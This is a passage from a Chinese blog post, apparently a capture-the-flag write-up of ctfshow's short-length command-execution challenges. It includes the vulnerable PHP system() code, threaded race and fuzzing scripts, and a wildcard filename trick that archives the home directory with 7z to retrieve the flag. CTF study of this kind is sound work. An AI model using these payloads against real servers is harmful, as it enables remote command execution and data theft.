+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><span class="hljs-keyword">import</span> time<br><br><br>url = <span class="hljs-string">&quot;http://c9c81c6d-23db-4e1c-9247-41c24da46c44.challenge.ctf.show/&quot;</span><br><br>payloads = [<br>    &#123;<span class="hljs-string">&quot;ctf_show&quot;</span>: <span class="hljs-string">&quot;&gt;cp&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;ctf_show&quot;</span>: <span class="hljs-string">&quot;*p&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;ctf_show&quot;</span>: <span class="hljs-string">&quot;&gt;hd&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;ctf_show&quot;</span>: <span class="hljs-string">&quot;*d*&quot;</span>&#125;<br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">data</span>):<br>    r = requests.post(url, data=data)<br>    <span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    send(payloads[<span class="hljs-number">0</span>])<br>    time.sleep(<span class="hljs-number">1</span>)<br>    executor = ThreadPoolExecutor(max_workers=<span class="hljs-number">50</span>)<br>    args_list = [payloads[<span class="hljs-number">1</span>], payloads[<span class="hljs-number">2</span>], payloads[<span class="hljs-number">3</span>]]<br>    <span class="hljs-keyword">for</span> args <span class="hljs-keyword">in</span> args_list:<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        executor.submit(send, args)<br></code></pre></td></tr></table></figure>
+<p>开始的命令写进去之后不能有什么影响之后就是按照顺序进行执行竞争确保在有限的时间进行覆盖内容</p>
+<h2 id="极限命令执行7"><a class="markdownIt-Anchor" href="#极限命令执行7"></a> 极限命令执行7</h2>
+<ul>
+<li>提示1：flag在用户家目录里，文件名未知</li>
+<li>提示2：可用字符是 数字、字母、特殊符号</li>
+</ul>
+<p>以上是给的提示<br>
+那么分析就是在<code>/home/*</code>中的某个文件，按照一般的逻辑应该是<code>/home/www-data</code>下的文件</p>
+<p>看代码给的是3长度</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-comment">#go back home , your flag is not here!</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf_show&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf_show&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$ctfshow</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ctfshow</span>) &lt;= <span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$ctfshow</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>首先执行<code>pwd</code>的命令回显是<code>/var/www/html</code></p>
+<p>那其实可以根据思考以及在本地的尝试<code>* ~</code>命令可以放到当前用户的目录里</p>
+<p>现在需要fuzz里面存在的命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br><br>requests.packages.urllib3.disable_warnings()<br><br>url=<span class="hljs-string">&quot;http://ae5b568a-d5fd-4733-8435-d4ad413d27aa.challenge.ctf.show/&quot;</span><br><br>chars = string.digits+string.ascii_lowercase<br><span class="hljs-keyword">for</span> cmd <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;&#x27;</span>.join(pair) <span class="hljs-keyword">for</span> pair <span class="hljs-keyword">in</span> itertools.product(chars, repeat=<span class="hljs-number">2</span>)]:<br>    r = requests.post(url, data=&#123;<span class="hljs-string">&#x27;ctf_show&#x27;</span>: cmd&#125;, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> r.content:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">40</span>)<br>        <span class="hljs-built_in">print</span>(cmd)<br>        <span class="hljs-built_in">print</span>(r.content)<br></code></pre></td></tr></table></figure>
+<p>这里看到7z是存在的，那么应该是打包到指定的目录</p>
+<p>这里没sleep那么直接执行就行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">7z</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">a</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">b</span><br>* ~<br></code></pre></td></tr></table></figure>
+<p>最后执行的逻辑就是<code>7z /home/www-data a b</code>a是add的意思最后打包成b.7z下载得到flag</p>
+<h1 id="后话"><a class="markdownIt-Anchor" href="#后话"></a> 后话</h1>
+<p>在八月月底终于水了一篇，前几天在群里看了狗哥发的文章，然后包子也发文章了，刚好借此水一篇</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>短字符长度RCE</div>
+      <div>https://0ran9ewww.github.io/2025/08/28/ctfshow/极限命令执行6&amp;7/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>orange</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月28日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年8月28日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/09/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC6%E9%93%BE/" title="Java反序列化-CC6链">
+                        <span class="hidden-mobile">Java反序列化-CC6链</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <p>本 blog 由 dkdun 支持</p> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+ 
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--鼠标点击礼花特效-->
+<script async src="/js/fireworks.js"></script>
